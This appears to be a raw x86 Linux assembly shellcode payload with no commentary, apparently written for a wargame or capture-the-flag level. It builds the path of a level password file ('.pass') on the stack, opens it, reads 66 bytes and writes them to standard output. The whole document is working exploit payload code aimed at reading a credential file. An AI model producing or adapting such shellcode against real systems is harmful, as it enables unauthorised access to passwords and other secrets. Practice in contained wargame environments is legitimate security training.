.text
	.globl  shellcode
    .type   shellcode, @function

shellcode:
	xorl %eax, %eax
	pushl %eax
	pushl $0x73736170
	pushl $0x2e2f3530
	pushl $0x6c657665
	pushl $0x6c2f2f73
	pushl $0x72657375
	pushl $0x2f2f656d
	pushl $0x6f682f2f

	xorl %edx, %edx
	xorl %ecx, %ecx
	movl %esp, %ebx
	movl $5, %eax
	int $0x80

	subl $66, %esp
	movl %eax, %ebx
	movl %esp, %ecx
	movl $66, %edx
	movl $3, %eax

	int $0x80
	movl $1, %ebx
	movl $4, %eax
	int $0x80